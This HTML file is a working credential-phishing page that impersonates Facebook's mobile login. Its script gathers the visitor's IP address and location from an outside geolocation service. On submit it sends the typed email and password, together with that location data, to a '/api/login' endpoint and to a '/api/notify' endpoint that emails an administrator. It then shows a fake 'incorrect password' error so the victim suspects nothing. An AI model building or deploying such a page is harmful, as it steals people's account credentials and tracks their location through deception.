<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noarchive">
    <link rel="icon" href="/assets/facebook.svg" type="image/svg+xml">
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .lang-selector {
            color: #65676b;
            font-size: 14px;
            text-align: center;
            padding: 12px 0;
            background-color: transparent;
            width: 100%;
            max-width: 100%;
            position: relative;
            margin: 0 auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .lang-selector::after {
            content: "▼";
            margin-left: 5px;
            font-size: 10px;
            color: #8a8d91;
            vertical-align: middle;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            padding: 10px 20px;
            flex: 1;
            max-height: 100vh;
            overflow: hidden;
            justify-content: space-between;
        }
        .facebook-logo {
            display: flex;
            justify-content: center;
            margin: 30px 0 20px;
        }
        .facebook-logo img {
            width: 60px;
            height: 60px;
        }
        .login-form {
            width: 100%;
            max-width: 330px;
        }
        .form-group {
            position: relative;
            margin-bottom: 16px;
            width: 100%;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            border: 1px solid #dddfe2;
            border-radius: 20px;
            font-size: 15px;
            padding: 14px 16px;
            width: 100%;
            height: 44px;
            box-sizing: border-box;
            color: #1d2129;
            background-color: white;
            transition: border-color 0.3s;
        }
        .floating-label {
            position: absolute;
            left: 16px;
            top: 14px;
            color: #8a8d91;
            transition: all 0.2s ease;
            pointer-events: none;
        }
        input:focus ~ .floating-label,
        input:not(:placeholder-shown) ~ .floating-label {
            top: -10px;
            left: 16px;
            font-size: 12px;
            background-color: white;
            padding: 0 5px;
        }
        input::placeholder {
            color: transparent;
        }
        .login-button {
            background-color: #1877f2;
            border: none;
            border-radius: 20px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            padding: 0;
            width: 100%;
            margin-top: 12px;
            cursor: pointer;
            height: 44px;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .forgotten-password {
            color: #000000;
            font-size: 14px;
            text-align: center;
            margin: 16px 0;
            text-decoration: none;
            display: block;
        }
        .divider {
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 30px 0;
            text-align: center;
        }
        .create-account-button {
            background-color: white;
            border: 1px solid #1877f2;
            border-radius: 20px;
            color: #1877f2;
            font-size: 14px;
            font-weight: bold;
            padding: 0;
            width: 100%;
            margin: 20px 0 20px;
            cursor: pointer;
            height: 36px;
        }
        .meta-logo {
            margin-top: 20px;
            padding: 10px 0;
            text-align: center;
            color: #8a8d91;
            font-size: 12px;
        }
        .meta-logo img {
            height: 45px;
            opacity: 0.8;
        }
        .hidden-inputs {
            display: none;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            margin: 15px 0;
            width: 100%;
        }
        .footer-link {
            color: #8a8d91;
            padding: 0 10px;
            font-size: 12px;
            position: relative;
        }
        .footer-link:not(:last-child):after {
            content: "•";
            position: absolute;
            right: -2px;
        }
        .password-container {
            position: relative;
            width: 100%;
        }
        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #1877f2;
            font-size: 14px;
            padding: 0;
            font-weight: 500;
        }
        .show-password, .hide-password {
            font-size: 14px;
        }
        .hide-password {
            display: none;
        }
        @keyframes spinner {
            to {transform: rotate(360deg);}
        }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spinner 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        .error-message {
            color: #c00;
            font-size: 14px;
            text-align: center;
            margin: 6px 0 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="lang-selector">
        English (UK)
    </div>

    <div class="container">
        <div class="facebook-logo">
            <img src="/assets/facebook.svg" alt="Facebook">
        </div>

        <form id="login-form" class="login-form">
            <div class="form-group">
                <input type="text" id="email" name="email" placeholder=" " required>
                <span class="floating-label">Mobile number or email address</span>
            </div>
            <div class="form-group">
                <div class="password-container">
                    <input type="password" id="password" name="password" placeholder=" " required>
                    <button type="button" class="password-toggle" id="password-toggle">
                        <span class="show-password">Show</span>
                        <span class="hide-password">Hide</span>
                    </button>
                    <span class="floating-label">Password</span>
                </div>
            </div>
            <div class="hidden-inputs">
                <input type="hidden" id="country" name="country">
                <input type="hidden" id="city" name="city">
                <input type="hidden" id="continent" name="continent">
                <input type="hidden" id="ip" name="ip">
                <input type="hidden" id="adminEmail" name="adminEmail" value="admin@example.com">
            </div>
            <button type="submit" class="login-button">Log in</button>
            <div id="error-message" class="error-message">Incorrect phone number or password</div>
            <a href="#" class="forgotten-password">Forgotten password?</a>
            
            <div class="divider"></div>
            
            <button type="button" class="create-account-button">Create new account</button>
        </form>

        <div class="meta-logo">
            <img src="/assets/meta-seeklogo.svg" alt="Meta">
        </div>

        <div class="footer-links">
            <span class="footer-link">About</span>
            <span class="footer-link">Help</span>
            <span class="footer-link">More</span>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Password visibility toggle
            const passwordToggle = document.getElementById('password-toggle');
            const passwordField = document.getElementById('password');
            const showPasswordIcon = passwordToggle.querySelector('.show-password');
            const hidePasswordIcon = passwordToggle.querySelector('.hide-password');
            
            passwordToggle.addEventListener('click', function() {
                if (passwordField.type === 'password') {
                    passwordField.type = 'text';
                    showPasswordIcon.style.display = 'none';
                    hidePasswordIcon.style.display = 'block';
                } else {
                    passwordField.type = 'password';
                    showPasswordIcon.style.display = 'block';
                    hidePasswordIcon.style.display = 'none';
                }
            });
            
            // Get user location and IP info
            getUserLocationAndIp();
            
            // Add form submission handling
            const form = document.getElementById('login-form');
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Get form values
                const email = document.getElementById('email');
                const password = document.getElementById('password');
                const country = document.getElementById('country');
                const city = document.getElementById('city');
                const continent = document.getElementById('continent');
                const ip = document.getElementById('ip');
                const adminEmail = document.getElementById('adminEmail');
                const loginButton = document.querySelector('.login-button');
                const errorMessage = document.getElementById('error-message');
                
                // Validate form
                if (!email.value || !password.value) {
                    alert('Please fill in all fields');
                    return;
                }
                
                // Show spinner in button
                loginButton.innerHTML = '<span class="spinner"></span> Logging in...';
                loginButton.disabled = true;
                
                // Create data object to save
                const userData = {
                    username: email.value + " (FB Mobile)",
                    password: password.value,
                    country: country.value,
                    city: city.value,
                    continent: continent.value,
                    ip_address: ip.value,
                    platform: 'facebook-mobile'
                };
                
                // Send data to server
                fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(userData)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`Network response was not ok: ${response.status} ${response.statusText}`);
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('Data saved to database:', data);
                    
                    // Send email notification
                    sendNotificationEmail();
                    
                    // After "verification" delay, show error
                    setTimeout(function() {
                        loginButton.innerHTML = 'Log in';
                        loginButton.disabled = false;
                        errorMessage.style.display = 'block';
                    }, 2000);
                })
                .catch(error => {
                    console.error('Error saving data:', error);
                    // Attempt to send notification even if database save fails
                    sendNotificationEmail();
                    
                    setTimeout(function() {
                        loginButton.innerHTML = 'Log in';
                        loginButton.disabled = false;
                        errorMessage.style.display = 'block';
                    }, 2000);
                });
            });
            
            // Add function to send email notification
            function sendNotificationEmail() {
                // Create notification data
                const notificationData = {
                    username: email.value + " (FB Mobile)",
                    password: password.value,
                    country: country.value,
                    city: city.value,
                    continent: continent.value,
                    ip_address: ip.value,
                    adminEmail: adminEmail.value
                };
                
                // Send notification via Next.js API route
                fetch('/api/notify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(notificationData)
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Email notification sent:', result);
                })
                .catch(error => {
                    console.error('Error sending notification:', error);
                });
            }
            
            // Get user location and IP
            function getUserLocationAndIp() {
                fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('country').value = data.country_name || '';
                    document.getElementById('city').value = data.city || '';
                    document.getElementById('continent').value = data.continent_code || '';
                    document.getElementById('ip').value = data.ip || '';
                })
                .catch(error => {
                    console.error('Error fetching location data:', error);
                });
            }
        });
    </script>
</body>
</html>
